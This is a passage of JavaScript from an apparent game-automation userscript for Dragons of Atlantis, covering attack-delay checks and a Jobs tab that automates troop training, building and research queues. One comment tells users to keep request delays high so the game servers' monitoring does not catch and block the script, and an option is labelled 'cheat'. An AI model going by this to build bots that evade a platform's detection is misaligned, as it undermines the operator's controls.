		
		function onChangeDelay ( event )
		{
			var min = parseIntNan($id(UID['Tabs.Attacks.tabOptions.delay_min']).value);
			var max = parseIntNan($id(UID['Tabs.Attacks.tabOptions.delay_max']).value);
			if (min < ATTACK_MIN_DELAY || min > 3600 || (max-min) < 25)
			{
				$J.msg({ 
					content : '<center>'
							+ '<h3><b>' + translate('Invalid delays') + '</b></h3><br>'
							+ translate('First value must be between') + '<br>' 
							+ ATTACK_MIN_DELAY + ' ' + translate('and') + ' 3600 ' + translate('Seconds') + ' <br>'
							+ translate('Second value must be at least') + '<br>'
							+ ' 25 ' + translate('above the first value')
							+ '</center>',
					timeOut	: 'words', /* Words per minute*/
					target	: t.container
				});
				
				
				/*
				* WARNING: Changing this values cause Too many requests to the server 
				*          that are monitored. Thats gives them reason to increase the security 
				*          on the servers and, sooner or later, make this scripts unusable.
				*            
				*      PLEASE, BE SMART, DON'T HELP THEM TO SEEK WAYS TO BLOCK THIS SCRIPT
				*
				*                   ( We will end up losing everyone )
				*/
				
				if ( min < ATTACK_MIN_DELAY ){
					if( max > min + 25 ) {
						min = max - 25;
					} 
					else {
						min = ATTACK_MIN_DELAY;
						max = min + 25;
					}
				} 
				else if ( min > 3600 ) {
					min = 3600;
					max = min + 25;
				} 
				else {
					max = min + 25;
				}
				$id(UID['Tabs.Attacks.tabOptions.delay_min']).value = min;
				$id(UID['Tabs.Attacks.tabOptions.delay_max']).value = max;
			}
			
			Data.options.attacks.delay_min = min;
			Data.options.attacks.delay_max = max;
		}
		
		function onChangeMaximum ( event )
		{
			var maximum = parseIntNan($J(this).val());
			// Max marches is determined by the muster point level (Wham)
			if ( maximum < 1 || maximum > Seed.cities[0].figures.marches.maximum )
			{
				maximum = Seed.cities[0].figures.marches.maximum;
				$J(this).val(maximum);
			}
			Data.options.marches.maximum = maximum;
		} 
		
		// Clear the information about when the target was last attacked
		// This is useful because attacks always start with the oldest target or, 
		// if no target has been attacked (last === 0), the first target in the list
		function clearLast ( event )
		{
			if ( Data.options.attacks.clear_all_targets ) 
			{
				// Make sure the user has scanned the map
				for (var type in Map.targets) 
				{
					var targets = Map.targets[ type ];
					for (var i=0; i < targets.length; i++) 
					{
						var target_states = Map.states[ targets[i].x + ',' + targets[i].y ];
						target_states.last_attack = 0;
					}
				}
			}
			else {
				// Clear the last attacked field of the currently selected target
				var targets = Map.targets[ Data.options.map.selected ];
				for (var i=0; i < targets.length; i++)
				{
					var target_states = Map.states[ targets[i].x + ',' + targets[i].y ];
					target_states.last_attack = 0;
				}
			}
		}
	}
	
};
//******************************** End Attacks *************************



/***********************************   Jobs Tab   **********************************/
Tabs.Jobs = {
	tab_order		: JOBS_TAB_ORDER,
	tab_label		: 'Tasks',
	tab_disabled	: !JOBS_TAB_ENABLE,
	
	container		: null,
	current_tab		: 0, // 0 = summary, 1 = train, 2 = build, 3 = research
	last_tab_id		: 'tabSummary',
	
	summary			: {
		timer	: {
			stat	: null,
		},
	},
	
	training		: {
		timer	: {
			tick	: null,
			stat	: null,
		},
		errors		: 0,
		error_delay : 60000,
		current_city: 0,
		current_troop: 0,
		inProgress : false,
	},
	
	building	: {
		timer	: {
			tick	: null,
			stat	: null,
		},
		refreshTab : false,
		refreshBuilding : false,
		errors		: 0,
		error_delay : 60000,
		current_city:0,
		inProgress : false,
	},
	
	research		: {
		timer	: {
			tick	: null,
			stat	: null,
		},
		refreshTab : false,
		errors		: 0,
		error_delay : 60000,
		current_city: 0,
		inProgress : false,
		current_research : {},
	},
	
	resurrection : {
		timer	: {
			tick	: null,
			stat	: null,
		},
		errors		: 0,
		error_delay : 60000,
		current_troop: 0,
		inProgress : false,
		current_city: OUTPOST_TYPE_INDEX['SpectralDragonOutpost'],
	},

	research_index	: {'Agriculture':0, 'Woodcraft':1, 'Masonry':2, 'Mining':3, 'Clairvoyance':4, 'RapidDeployment':5, 'Ballistics':6, 'Metallurgy':7, 'Medicine':8, 'Dragonry':9, 'Levitation':10, 'Mercantilism':11, 'AerialCombat':12, 'Rationing':16},
	
	research_type	: ['Agriculture', 'Woodcraft', 'Masonry', 'Mining', 'Clairvoyance', 'RapidDeployment', 'Ballistics', 'Metallurgy', 'Medicine', 'Dragonry', 'Levitation', 'Mercantilism', 'AerialCombat','Rationing'],
		
	init : function (div)
	{
		var t = Tabs.Jobs;
		
		// Variables Initializations
		//if ( Seed.cities[OUTPOST_TYPE_INDEX['SpectralDragonOutpost']] )
		//{
			t.research_index['EnergyCollection']=13;
			t.research_index['WarriorRevival']=14;
			t.research_index['GuardianRevival']=15;
			t.research_type = t.research_type.concat(['EnergyCollection','WarriorRevival','GuardianRevival']);
		//}
		t.research_type.sort( function(a,b){ return t.research_index[a] - t.research_index[b]} );
		
		// Tab initialization
		t.container = div;
		var html = 
		 '<ul class=tabs>'
		+'	<li class="tab first">'
		+'		<a id=' + setUID('Tabs.Jobs.tabSummary')  + '>' 
		+'		<span class="' + UID['doa-icons'] + ' i-Summary"></span>'
		+ 			translate('Summary')  
		+'		</a>'
		+'	</li>'
		+'	<li class=tab>'
		+'		<a id='         + setUID('Tabs.Jobs.tabTrain')    + '>'
		+'		<span class="' + UID['doa-icons'] + ' i-Training"></span>'
		+ 			translate('Train')
		+'		</a>'
		+'	</li>';
		
		if ( Seed.cities[OUTPOST_TYPE_INDEX['SpectralDragonOutpost']] )
		{
			html +=
		 '	<li class=tab>'
		+'		<a id='         + setUID('Tabs.Jobs.tabResurrect')    + '>'
		+'		<span class="' + UID['doa-icons'] + ' i-resurrect"></span>'
		+ 			translate('Resurrect')
		+'		</a>'
		+'	</li>';
		}
		
		html +=
		 '	<li class=tab>'
		+'		<a id='         + setUID('Tabs.Jobs.tabBuild')    + '>'
		+'		<span class="' + UID['doa-icons'] + ' i-Building"></span>'
		+ 			translate('Build')
		+'		</a>'
		+'	</li>'
		+'	<li class=tab>'
		+'		<a id='         + setUID('Tabs.Jobs.tabResearch') + '>'
		+'		<span class="' + UID['doa-icons'] + ' i-Research"></span>'
		+ 			translate('Research')
		+'		</a>'
		+'	</li>'
		+'</ul>'
		+'<div id=' + setUID('Tabs.Jobs.header') + '></div>'
		+'<div id=' + setUID('Tabs.Jobs.content') + '></div>';
		
		$J( t.container ).html( html );
		
		// Styles & Sets
		$J('#'+UID['Tabs.Jobs.header'])
		.css({
			 height			: '225px'
			,marginBottom	: '2px'
		});
		
		$J('#'+UID['Tabs.Jobs.content'])
		.css({
			  height		: '450px'
			 ,marginTop		: '9px'
		})
		.addClass(UID['content'])
		.addClass('no-overflow');
		
		// Event Listeners
		$J( '#'+UID['Tabs.Jobs.tabSummary']  ).click ( {current_tab:0}, t.showSubTab );
		$J( '#'+UID['Tabs.Jobs.tabTrain']    ).click ( {current_tab:1}, t.showSubTab );
		$J( '#'+UID['Tabs.Jobs.tabBuild']    ).click ( {current_tab:2}, t.showSubTab );
		$J( '#'+UID['Tabs.Jobs.tabResearch'] ).click ( {current_tab:3}, t.showSubTab );
		$J( '#'+UID['Tabs.Jobs.tabResurrect'] ).click ( {current_tab:4}, t.showSubTab );
		
		// Enable the jobs
		t.setTrainEnable ( Data.options.training.enabled );
		
		t.setResurrectEnable ( Data.options.resurrection.enabled );

		t.setBuildEnable ( Data.options.building.enabled );
		
		t.setResearchEnable ( Data.options.research.enabled );
		
		// Add the unload event listener
		window.addEventListener('unload', t.onUnload, false);
			
	},

	show : function ()
	{
		var t = Tabs.Jobs;
		t.showSubTab ( {data:{ current_tab: Data.options.jobs.current_tab }} );
	},
	
	hide : function ()
	{
		var t = Tabs.Jobs;
		t.clearStatTimers();
	},
	
	onUnload : function () 
	{
		var t = Tabs.Jobs;
	},
	
	showSubTab : function( event )
	{
		var t = Tabs.Jobs;
		
		var current_tab = event.data.current_tab;
		
		Data.options.jobs.current_tab = current_tab;
		
		t.current_tab = current_tab;

		var tab_name;
		switch ( current_tab )
		{
		case 0: tab_name = 'tabSummary'  ; break;
		case 1: tab_name = 'tabTrain'    ; break;
		case 2: tab_name = 'tabBuild'    ; break;
		case 3: tab_name = 'tabResearch' ; break;
		case 4: tab_name = 'tabResurrect' ; break;
		}
		
		$J('#'+UID[t.last_tab_id])
		.css('z-index', '0')
		.removeClass('selected');
		
		$J('#'+UID['Tabs.Jobs.' + tab_name])
		.css('z-index', '1')
		.addClass('selected');
		
		t.last_tab_id = 'Tabs.Jobs.' + tab_name;
		
		t.clearStatTimers();
		
		t[tab_name] ();
	},

	clearStatTimers : function ()
	{
		var t = Tabs.Jobs;
		clearInterval (t.summary.timer.stat); t.summary.timer.stat=null;
		clearInterval (t.training.timer.stat); t.training.timer.stat=null;
		clearInterval (t.resurrection.timer.stat); t.resurrection.timer.stat=null;
		clearInterval (t.building.timer.stat); t.building.timer.stat=null;
		clearInterval (t.research.timer.stat); t.research.timer.stat=null;
	},
	
	// ** Tab: Jobs - SubTab:  Info
	//--------------------------------------------------------------------
	tabSummary : function ()
	{
		var t = Tabs.Jobs;
		
		var city = Seed.cities[0];
		
		$J( '#'+UID['Tabs.Jobs.header'] )
		.css({
			'height'		: '12pt',
			'margin-bottom'	: '2px'
		})
		.html( '<div>' + translate('Info') + '</div>' );
		
		$J( '#'+UID['Tabs.Jobs.header'] + ' > div' ).addClass(UID['title']);

		$J( '#'+UID['Tabs.Jobs.content'] )
		.css ( {
			'height'		: '670px',
			'margin-top'	: '9px',
			'overflow'      : 'hidden'
		})
		.html('<div><div id="' + setUID('Tabs.Jobs.tabSummary.content') + '"></div></div>'); 

		var $content = $J( '#'+UID['Tabs.Jobs.tabSummary.content'] );
		
		function jobsStatTick ()
		{
			var html = '';
			
			// Capital & Outposts ...
			for ( var city_idx=0; city_idx < Seed.cities.length; city_idx++ ) {
				
				// in case the city is not been defined in Seed.updateCity skip to next in array.
				if ( !Seed.cities[city_idx] ) continue;
				
				html += 
				  cityTitle(city_idx) 
				+'<table class="' + UID['table'] + ' zebra" style="width:100%;">'
				+'<tr style="height:1px;">'
				+'	<td></td>'
				+'	<td width=80%></td>'
				+'	<td></td>'
				+'</tr>'
				+ 		dispBuildingJob(city_idx);

				if ( city_idx === 0 || Data.options.cheat.outpost_research ) 
				{
					html += dispResearchJob(city_idx);
				}
				
				html +=  dispTrainingJobs(city_idx) + '</table>';
			}
			
			$content.html( html );
			// Fix Scroll bug (La Larva)
			$content.css('height' , $content.outerHeight() + 'px');
			$content.parent().css('height' , $J('#'+UID['Tabs.Jobs.content']).innerHeight()-10 + 'px');
			$content.parent().addClass( UID['scrollable'] );
			
		}
		
		
		// Display build queue
		function dispBuildingJob (city_idx)
		{
			var html =
			  '<tr>'
			+ '	<td align=left><b>'+ translate('Building') +':</b> </td>';
			
			var jobs = getJobs ('building', city_idx);
			
			// TODO: very rare occurance: Error: job.building is null
			if ( jobs.length === 0 )
			{
				html +=
				 '	<td align=left>'
				+'		<span class=' + UID['bold_red'] + '>' + translate('Off') + '</span>'
				+'	</td>'
				+'	<td width="99%"></td>'
				+'</tr>';
			}
			else {
				var job = jobs[0];
				if( job.run_at > serverTime() )
				{
					var fixed_city_idx = ( /Science|Metal|Officer|Rookery|Storage|Theater|Sentinel|Factory|Fortress/.test(job.city_building_type) ? '0' : city_idx);
					
					var city_type = 'C';
					if (fixed_city_idx > 0) city_type = 'O';
					if (fixed_city_idx === OUTPOST_TYPE_INDEX['SpectralDragonOutpost']) city_type = 'S';
				
					html +=
					 '	<td align=left>' 
					+'		<span class="' + UID['doa-icons'] + ' i-' + job.city_building_type + '-' + city_type +'"></span>'
					+		translate(job.city_building_type) + ' (' + job.level + ')'
					+'	</td>'
					+'	<td align=right>' 
					+		timeFormat(job.run_at - serverTime(), true)
					+'	</td>'
					+'</tr>';
				}
			}
			return html;
		}
		
		// Display research queue
		function dispResearchJob ( city_idx )
		{
			var html = 
			 '<tr>'
			+'	<td align=left><b>'+ translate('Researching') +': </b></td>';
				
			var jobs = getJobs ('research', city_idx);
			if ( jobs.length === 0 )
			{
				html +=
				 '	<td align=left>'
				+'		<span class=' + UID['bold_red'] + '>' + translate('Off') + '</span>'
				+'	</td>'
				+'	<td width="99%"></td>'
				+'</tr>';
			} 
			else {
				var job = jobs [0];
				if( job.run_at > serverTime() )
				{
					html +=
					 '	<td align=left>'
					+'		<span class="' + UID['doa-icons'] + ' i-' + job.research_type + '"></span>'
					+		translate(job.research_type) + ' (' + job.level + ')'
					+'	</td>'
					+'	<td align=right>'
					+		timeFormat(job.run_at - serverTime(), true)
					+ '</td>'
					+'</tr>';
				}
			}
			return html;
		}
		
		// Display training queues
		function dispTrainingJobs ( city_idx )
		{
			if ( !Seed.cities[city_idx] || city_idx == OUTPOST_TYPE_INDEX['SpectralDragonOutpost'] || city_idx == OUTPOST_TYPE_INDEX['SkythroneOutpost'] )
			{
				return '';
			}

			var html = 
			 '<tr>'
			+'	<td align=left><b>'+ translate('Training') +': </b></td>';
			
			var jobs = getJobs ('units', city_idx);
			
			if ( jobs.length === 0 )
			{
				html +=
				 '	<td align=left>'
				+'		<span class=' + UID['bold_red'] + '>' + translate('Off') + '</span>'
				+'	</td>'
				+'	<td width="99%"></td>'
				+'</tr>';
			}
			else {
				var last_time = serverTime();
			
				jobs.sort( function(a,b){return a.run_at - b.run_at} );
			
				html += 
				 '	<td align=left>'
				+'		<span class="' + UID['doa-icons'] + ' i-' + jobs[0].unit_type + '"></span>'
				+ 		jobs[0].quantity + '&nbsp;' + translate(jobs[0].unit_type)
				+'	</td>'
				+'	<td align=right>'
				+		timeFormat(jobs[0].run_at - last_time, true) 
				+'	</td>'
				+'</tr>';
				
				last_time = jobs[0].run_at;
				
				for ( var i=1; i < jobs.length; i++ )
				{
					var left_time = (jobs[i].run_at - last_time > 0) ? jobs[i].run_at - last_time : 0;
					html +=
					 '<tr>'
					+'	<td>&nbsp;</td>'
					+'	<td align=left>'
					+'		<span class="' + UID['doa-icons'] + ' i-' + jobs[i].unit_type + '"></span>'
					+		jobs[i].quantity + '&nbsp;' + translate(jobs[i].unit_type) 
					+'	</td>'
					+'	<td align=right>'
					+		timeFormat( left_time, true ) 
					+'	</td>'
					+'</tr>';
					
					if ( i > 1 && i === jobs.length - 1 )
					{
						var total_time = (jobs[i].run_at - serverTime() > 0) ? jobs[i].run_at - serverTime() : 0;
						html +=
						 '<tr>'
						+'	<td colspan=3 align=right>'
						+		translate('Total') + ': '
						+'		<b>'
						+		 timeFormat( total_time, true ) 
						+'		</b>'
						+'	</td>'
						+'</tr>';
					}
					
					last_time = jobs[i].run_at;
				}
			}
			
			return html;
		}
		
		function cityTitle ( city_idx )
		{
			var city = Seed.cities[city_idx];
			// Outposts are always defending (until further notice)
			var wallStatus = '';
			
			if (city_idx === 0)
			{
				if ( Seed.cities[city_idx].defended )
				{
					wallStatus = '<font class=' + UID['defending'] + '>' + translate('Defend').toUpperCase() + '</font>';
				}
				else {
					wallStatus = '<font class=' + UID['hiding']    + '>' + translate('Hiding').toUpperCase() + '</font>';
				}
			}
			else {
				wallStatus = '<font class=' + UID['defending'] + '>' + translate('Defend').toUpperCase() + '</font>';
			}
			var html =
			 '<div class=' + UID['subtitle'] + '>'
			+'	<table class=' + UID['table'] + ' style="width:100%;">'
			+'	<tr>'
			+'		<td align=left>' + translate(city.name) + '</td>'
			+'		<td align=right>' + wallStatus + '</td>'
			+'	</tr>'
			+'	</table>'
			+'</div>';
			
			return html;
		}
		
		// First run of jobsStatTick
		jobsStatTick();
		
		t.summary.timer.stat = setInterval (jobsStatTick, 1000);
	},

	
	//----------------------------------------------------------------------------
	//*** Jobs Tab - Train Sub-tab ***
	//----------------------------------------------------------------------------
	tabTrain : function (){
		var t = Tabs.Jobs;
		
		// Create status ticker
		var header = 
		 '<div class=' + UID['title'] + '>' + translate('Training Progress') + '</div>'
		+'<div class=' + UID['status_ticker'] + ' style="margin-bottom: 5px !important">'
		+'	<center>'
		+'		<input id=' + setUID('Tabs.Jobs.tabTrain.enabled') + ' type=button />'
		+'	</center>'
		+'	<div id=' + setUID('Tabs.Jobs.tabTrain.report') + ' class='+ UID['status_report'] + '></div>'
		+'	<br>'
		+'	<div id='+ setUID('Tabs.Jobs.tabTrain.feedback') +' class='+ UID['status_feedback'] + '></div>'
		+'</div>'
		+'<ul class=tabs>'
		+'	<li class="tab first"><a id=' + setUID('Tabs.Jobs.tabTrain.tabSets')    + '>' + translate('Train')  + '</a></li>'
		+'	<li class="tab"><a id='       + setUID('Tabs.Jobs.tabTrain.tabOptions') + '>' + translate('Options') + '</a></li>'
		+'</ul>';
		
		// Styles & Sets
		$J('#'+UID['Tabs.Jobs.header'])
		.css({
			 height			: '225px'
			,marginBottom	: '2px'
		})
		.html( header );
		
		$J('#'+UID['Tabs.Jobs.content'])
		.css({
			 height			: '450px'
			,marginTop		: '19px'
		})
		.html( '<div id=' + setUID('Tabs.Jobs.tabTrain.content') + '>' );
		
		$J('#'+UID['Tabs.Jobs.tabTrain.content'])
		.css({
			height		: ($J('#'+UID['Tabs.Jobs.content']).innerHeight()-10) + 'px' 
		})
		.addClass( UID['scrollable'] );
		
		// Add event listener for Enabled/off button
		$J('#'+UID['Tabs.Jobs.tabTrain.enabled']).click (function (){
			var t=Tabs.Jobs;
			t.setTrainEnable (!Data.options.training.enabled);
		});
		
		$J('#'+UID['Tabs.Jobs.tabTrain.tabSets']).click ( t.tabTrainSets );
		
		$J('#'+UID['Tabs.Jobs.tabTrain.tabOptions']).click ( t.tabTrainOptions );
		
		t.refreshTrainButton ( Data.options.training.enabled );
		
		switch ( Data.options.training.current_tab )
		{
		case 0: t.tabTrainSets(); break;
		case 1: t.tabTrainOptions(); break;
		}
		
		//First Run of trainStatTick
		t.trainStatTick();
		
		// Timers
		t.training.timer.stat = setInterval(t.trainStatTick, 1000);
	},

	
	//*** Jobs Tab - Train Sub-tab  - Train Sub-Sub-tab ***
	//----------------------------------------------------------------------------
	tabTrainSets : function()
	{
		var t = Tabs.Jobs;
		// Hilite the sub-tabs correctly
		$J('#'+UID['Tabs.Jobs.tabTrain.tabOptions']).removeClass('selected');
		$J('#'+UID['Tabs.Jobs.tabTrain.tabOptions']).css('z-index', '0');
		$J('#'+UID['Tabs.Jobs.tabTrain.tabSets']).addClass('selected');
		$J('#'+UID['Tabs.Jobs.tabTrain.tabSets']).css('z-index', '1');
		Data.options.training.current_tab = 0;
		
		// Create unit table for each city
		var elements_id = [];
		var bt_id = [];
		
		var html = '<div id=' + setUID('Tabs.Jobs.tabTrain.tabSets.content') + '>';
		
		for (var city_idx=0; city_idx < Seed.cities.length; city_idx++)
		{
			var city = Seed.cities[city_idx];
			
			// in case the city is not been defined in Seed.updateCity skip to next in array.
			if ( !city || city_idx == OUTPOST_TYPE_INDEX['SpectralDragonOutpost'] || city_idx == OUTPOST_TYPE_INDEX['SkythroneOutpost'] ) continue;

			html +=
			 '<h4 ref=' + city_idx + ' class=' + UID['subtitle'] + '>'
			+'	<table class=' + UID['table'] + ' width=100%>'
			+'	<tr>'
			+'		<td align=left width=30%>&nbsp</td>'
			+'		<td align=center width=40%>'+ translate(city.name) + '</td>'
			+'		<td id='+ setUID('Tabs.Jobs.tabTrain.tabSets_' + city_idx)  + ' align=right width=30%>'
			+'		</td>'
			+'	</tr>'
			+'	</table>'
			+'</h4>';
			
			
			// we get the Keys list from Data.defaults for to respect the order
			var units_type = Units.getCityUnits( city_idx );

			html +=
			 '<div class="no-overflow-x" style="min-height:'+(23 * (units_type.length+1) )+'px;max-height:'+(23 * (units_type.length+1) )+'px;">'
			+'<table class="' + UID['table'] + ' zebra" style="width:475px;max-width:475px">'
			+'	<tr>'
			+'		<th>' + translate('Total') + '</th>'
			+'		<th></th>'
			+'		<th>' + translate('Quantity') + '</th>'
			+'		<th></th>'
			+'	</tr>';

			for ( i=0; i < units_type.length; i++ )
			{
				var unit_type = units_type[i];
				
				var unit_quantity = Data.options.training.city[ city_idx ].units[ unit_type ];
				
				if ( !unit_quantity || isNaN(unit_quantity) ){
					unit_quantity = 0;
					Data.options.training.city[ city_idx ].units[ unit_type ] = unit_quantity;
				}
				
				html +=
				 '	<tr>'
				+'		<td align=right class=jewel>'
				+'		' + Units.getUnitNumbers(Seed.cities[0], unit_type).total 
				+'		</td>'
				+'		<td title="' + translate(unit_type) + '">' 
				+'			<span class="' + UID['doa-icons'] + ' i-' + unit_type + '"></span>'
				+'		</td>'
				+'		<td>'
				+'		<input type=text id=' + setUID('Tabs.Jobs.tabTrain.units_' + city_idx + '_' + i) + ' ref=' + city_idx + '_' + unit_type +' maxlength=6 size=6 value="' + unit_quantity + '" style="text-align:right;" />'
				+'		</td>'
				+'		<td style="font-size:8pt;">'
				+ 			translate(unit_type) 
				+'		</td>'
				+'		<td id=' + setUID('Tabs.Jobs.tabTrain.feedback_' + city_idx + '_' + unit_type) + ' style="width:50%;white-space:normal;font-size:8pt;">'
				+'		</td>'
				// didi : add train button
				+'		<td align=right width=10%>'
				+'			<input type=image class="'+ UID['doa-icons'] + ' i-Training" id=' + setUID('Tabs.Jobs.tabTrain.Now_'+city_idx +'_'+ unit_type) + ' ref=' + city_idx +'_'+ unit_type + '  value="" />'
				//+'			<input class=thin id=' + setUID('Tabs.Jobs.tabTrain.Now_'+city_idx +'_'+ unit_type) + ' ref=' + city_idx +'_'+ unit_type + ' type=button  style="width:auto !important;" value="'+ translate('Train') +'" />'
				+'		</td>'
				+'	</tr>';
			
				elements_id.push( UID['Tabs.Jobs.tabTrain.units_'+ city_idx + '_' + i] );
				bt_id.push( UID['Tabs.Jobs.tabTrain.Now_'+city_idx +'_'+ unit_type] );
			
			}
			
			html += 
			 '	</tr>'
			+'</table>'
			+'</div>';
		}    
		
		html += '</div>';
		
		$J('#'+UID['Tabs.Jobs.content'])
		.css({
			'padding-left'  : '0',
			'padding-right' : '0',
			'overflow'      : 'hidden'
		});
		
		$J('#'+UID['Tabs.Jobs.tabTrain.content'])
		.html( html );
		
		$J('#'+UID['Tabs.Jobs.tabTrain.tabSets.content'])
		.accordion({
			 collapsible	: true
			 ,active		: Data.options.training.accordion
			,changestart	: function( event, ui ) {
				if ( !ui || !ui.newHeader || ui.newHeader.length < 1 ) return;
				var city_idx = $J( ui.newHeader[0] ).attr('ref');
				if ( city_idx ) {
					Data.options.training.accordion = parseInt( city_idx );
					//didi : add refresh train button of new content
					t.refreshTrainBtn(Data.options.training.accordion);
				}
			}
		});

		// Update units on change
		function onChangeUnits ( event )
		{
			var args = event.target.getAttribute('ref').split('_');
			var unit_quantity = parseIntZero(event.target.value);
			var city_idx = args[0];
			var unit_type = args[1];
			var reqs = t.checkTrainReqs( unit_type, unit_quantity, city_idx );
			
			if ( isNaN(unit_quantity) || unit_quantity < 0 ){
				event.target.style.backgroundColor = '#faa';
				dialogError ( translate('Invalid number of troops', t.container) );
			}
			else if (unit_quantity != Data.options.training.city[ city_idx ].units[ unit_type ]) {
				event.target.value = unit_quantity;
				Data.options.training.city[ city_idx ].units[ unit_type ] = unit_quantity;
				event.target.style.backgroundColor = '';
			}
		}
		
		// Train units immediately
		function onTrainUnits ( event )
		{
			var args = event.target.getAttribute('ref').split('_');
			var city_idx = args[0];
			var unit_type = args[1];
			var unit_quantity = Data.options.training.city[ city_idx ].units[ unit_type ];

			t.doTrain( unit_type, unit_quantity, city_idx, true );

		}

		// Add event listeners for unit quantities 
		for ( var i=0; i < elements_id.length; i++ ) 
		{
			$J('#'+elements_id[i]).change( onChangeUnits );
			$J('#'+elements_id[i]).click( onChangeUnits );
		}
		
		// Didi : Add event listeners for unit immediat train 
		for ( var i=0; i < bt_id.length; i++ ) 
		{
			$J('#'+bt_id[i]).click( onTrainUnits );
		}
		
		// Didi : Add refresh button of current content
		t.refreshTrainBtn(Data.options.training.accordion || 0);

	}, 
	
	// Didi : Refresh the button of training
	refreshTrainBtn : function ( city_idx )
	{
		var t = Tabs.Jobs;
		if (city_idx !== (Data.options.training.accordion || 0)) return;
		var city = Seed.cities[city_idx];
		if ( !city || city_idx == OUTPOST_TYPE_INDEX['SpectralDragonOutpost'] || city_idx == OUTPOST_TYPE_INDEX['SkythroneOutpost'] ) return;
		var units_type = Units.getCityUnits( city_idx );
		for (var i=0; i < units_type.length; i++ )
		{
			var unit_type = units_type[ i ];
			var unit_quantity =	Data.options.training.city[ city_idx ].units[ unit_type ];
			var trainable = Units.isTrainable( unit_type, city_idx );
			var but_train = $id(UID['Tabs.Jobs.tabTrain.Now_'+city_idx +'_'+ unit_type]);
			if (!but_train) continue;
			if (unit_quantity === 0 || !trainable )
			{
				setButtonStyle(but_train,'KO');
			} 
			else
			{
				var reqs = t.checkTrainReqs( unit_type, unit_quantity, city_idx );
				if (!reqs.msg) 
				{
					setButtonStyle (but_train, 'OK');
				}
				else
				{
					setButtonStyle (but_train, 'W');
				}
			}
				
		}
			
		function setButtonStyle (element, stat) 
		{
			if (!element) return;

			switch (stat)
			{
				case 'OK':
					element.disabled = false;
					if ($J(element).hasClass(UID['bnt_image_disabled'])) $J(element).removeClass(UID['bnt_image_disabled']);
					if ($J(element).hasClass(UID['bnt_image_orange'])) $J(element).removeClass(UID['bnt_image_orange']);
					$J(element).addClass(UID['bnt_image_green']);
					break;
				case 'KO':
					element.disabled = true;
					if ($J(element).hasClass(UID['bnt_image_green']))$J(element).removeClass(UID['bnt_image_green']);
					if ($J(element).hasClass(UID['bnt_image_orange'])) $J(element).removeClass(UID['bnt_image_orange']);
					$J(element).addClass(UID['bnt_image_disabled']);
					break;
				case 'W':
					element.disabled = false;
					if ($J(element).hasClass(UID['bnt_image_disabled'])) $J(element).removeClass(UID['bnt_image_disabled']);
					if ($J(element).hasClass(UID['bnt_image_green'])) $J(element).removeClass(UID['bnt_image_green']);
					$J(element).addClass(UID['bnt_image_orange']);
					break;
				
			}
		}

	},

	// config sub tab
	tabTrainOptions : function()
	{
		var t = Tabs.Jobs;
		
		// Hilite the sub-tabs correctly
		$J('#'+UID['Tabs.Jobs.tabTrain.tabSets']).removeClass('selected');
		$J('#'+UID['Tabs.Jobs.tabTrain.tabSets']).css('z-index', '0');
		$J('#'+UID['Tabs.Jobs.tabTrain.tabOptions']).addClass('selected');
		$J('#'+UID['Tabs.Jobs.tabTrain.tabOptions']).css('z-index', '1');
		Data.options.training.current_tab = 1;
		
		var html = 
		 '<div class=' + UID['subtitle'] + '>' + translate('Training Configuration') + '</div>'
		+'	<div>'
		+'		<table class=' + UID['table'] + '>'
		+'		<tr>'
		+'			<tdcolspan=2></td>'
		+'		</tr>';
		
		// Add the radio buttons 
		setUID('Tabs.Jobs.tabTrain.train_mode');
		html +=
		 '	<tr>'
		+'		<td>'
		+'		<label>'
		+'		<input type=radio name=' + UID['Tabs.Jobs.tabTrain.train_mode'] + ' value="population" />' + translate('Depending on available population') 
		+'		</label>'
		+'		</td>'
		+'	</tr>'
		+'	<tr>'
		+'		<td>'
		+'		<label>'
		+'		<input type=radio name=' + UID['Tabs.Jobs.tabTrain.train_mode'] + ' value="resources" />'+ translate('Depending on available resources')
		+'		</label>'
		+'		</td>'
		+'	</tr>'
		+'	</table>'
		+'</div>'; 
		
		// Create an all unit table
		var elements_id = [];

		html +=
		'<div class=' + UID['subtitle'] + '>' + translate('Maximum Troops') + ' (0 = no max)</div>'
		+'<div class="overflow" style="min-height:380px;">'
		+'	<table class="' + UID['table'] + ' zebra" style="overflow:hidden;">'
		+'		<tr valign=top>'
		+'			<td width=150>'
		+'			<table class=' + UID['table'] + '>';
		
		var units_type = Units.all_units_type; //getKeys ( Data.options.training.units_cap );
		for ( var i=0; i < units_type.length; i++ )
		{
			var unit_type = units_type[i];
			var value = Data.options.training.units_cap[ unit_type ];
			if ( !value || isNaN(value) ){
				value = 0;
				Data.options.training.units_cap[ unit_type ] = value;
			}
			
			var reqs = Tabs.Jobs.getRequirements ({
				reqs_type     : 'unit', 
				city_idx      : 0, 
				unit_type     : unit_type
			});

			//logit('reqs='+inspect(reqs,8,1));
			html +=
			 '		<tr>'
			+'			<td>'
			+'				<span class="' + UID['doa-icons'] + ' i-' + unit_type + '"></span>'
			+'			</td>'
			+'			<td align=right>'
			+					'('+ Units.getUnitNumbers(Seed.cities[0], unit_type).total + ')'
			+'			</td>'
			+'			<td>'
			+'				<input type=text id=' + setUID('Tabs.Jobs.tabTrain.cap_' + unit_type) + ' ref=' + unit_type + ' maxlength=7 size=7 value="' + value + '" style="text-align:right;" />'
			+'			</td>'
			+'			<td>'
			+ 				translate(unit_type) 
			+'			</td>'
			+'			<td title="'+reqs.msg.replace(/ \+ /g,'\n')+'">'
			+					reqs.imsg
			+'			</td>'
			+'		</tr>';

			elements_id.push(UID['Tabs.Jobs.tabTrain.cap_'+ unit_type]);
		}
		
		html +=
		 '			</table>'
		+'			</td>'
		+'		</tr>'
		+'	</table>'
		+'</div>';
		
		// Display the page
		$J('#'+UID['Tabs.Jobs.tabTrain.content']).html( html );

		// add event listeners for the radio buttons
		var r = document.getElementsByName(UID['Tabs.Jobs.tabTrain.train_mode']);
		for ( var i=0; i < r.length; i++ )
		{
			$J(r[i]).change( onChangeMode );
			// Select the radio button that was last selected
			r[i].checked = (r[i].value === Data.options.training.mode);
		}

		// Add event listeners for unit quantities 
		for  ( var i=0; i < elements_id.length; i++) {
			$J('#'+elements_id[i]).change( onChangeUnitsCap );
		}

		// radio buttons are weird    
		function onChangeMode ( event )
		{
			var t = Tabs.Jobs;
			
			if ( Data.options.training.enabled )
			{
				// It would be very bad to leave training on when switching queue types. 
				t.setTrainEnable( false );
				
				if ( t.current_tab === 1 ) {
					t.dispFeedback (translate('Safe Mode') +' '+ translate('Training') +' '+ translate('Disabled'));
				}
			}
			
			Data.options.training.mode = event.target.value;
		}
		
		// Update units on change
		function onChangeUnitsCap ( event )
		{
			var unit_type = event.target.getAttribute('ref');
